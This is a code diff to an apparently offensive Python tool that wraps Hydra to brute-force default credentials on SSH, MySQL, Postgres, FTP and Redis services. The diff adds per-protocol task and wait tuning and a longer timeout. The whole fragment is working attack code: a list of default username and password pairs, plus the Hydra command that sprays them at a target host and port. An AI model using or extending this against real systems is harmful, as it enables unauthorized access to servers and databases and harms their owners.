@@ -9,11 +9,11 @@ log = logging.getLogger("rich")
 
 # The Snipe Dictionary: Only the most lethal, default misconfigurations
 CREDENTIALS = {
-    22: {"protocol": "ssh", "users": "root,admin,ubuntu,centos", "passwords": "root,admin,password,ubuntu,centos"},
-    3306: {"protocol": "mysql", "users": "root,admin", "passwords": "root,admin,password"},
-    5432: {"protocol": "postgres", "users": "postgres,root,admin", "passwords": "postgres,root,admin,password"},
-    21: {"protocol": "ftp", "users": "anonymous,root,admin", "passwords": "anonymous,root,admin"},
-    6379: {"protocol": "redis", "users": "default,root", "passwords": "root,admin,password,redis"}
+    22: {"protocol": "ssh", "wait": "4", "tasks": "4", "users": "root,admin,ubuntu,centos", "passwords": "root,admin,password,ubuntu,centos"},
+    3306: {"protocol": "mysql", "wait": "15", "tasks": "1", "users": "root,admin", "passwords": "root,admin,password"},
+    5432: {"protocol": "postgres", "wait": "15", "tasks": "1", "users": "postgres,root,admin", "passwords": "postgres,root,admin,password"},
+    21: {"protocol": "ftp", "wait": "5", "tasks": "4", "users": "anonymous,root,admin", "passwords": "anonymous,root,admin"},
+    6379: {"protocol": "redis", "wait": "5", "tasks": "4", "users": "default,root", "passwords": "root,admin,password,redis"}
 }
 
 def run_hydra(session, config):
@@ -76,14 +76,15 @@ def run_hydra(session, config):
             "hydra", 
             "-L", ".hydra_users.txt", 
             "-P", ".hydra_pass.txt", 
-            "-t", "4",          # 4 parallel tasks
-            "-w", "3",          # 3 second timeout
-            "-I",               # Ignore restore files
+            "-t", payload.get("tasks", "4"),
+            "-w", payload.get("wait", "5"),
+            "-I",
             f"{protocol}://{host}:{port}"
         ]
 
         try:
-            process = subprocess.run(strike_cmd, capture_output=True, text=True, timeout=45)
+            # Heavy DB handshakes require giving the subprocess up to 120 seconds to resolve
+            process = subprocess.run(strike_cmd, capture_output=True, text=True, timeout=120)
             output = process.stdout
             
             # Check for success
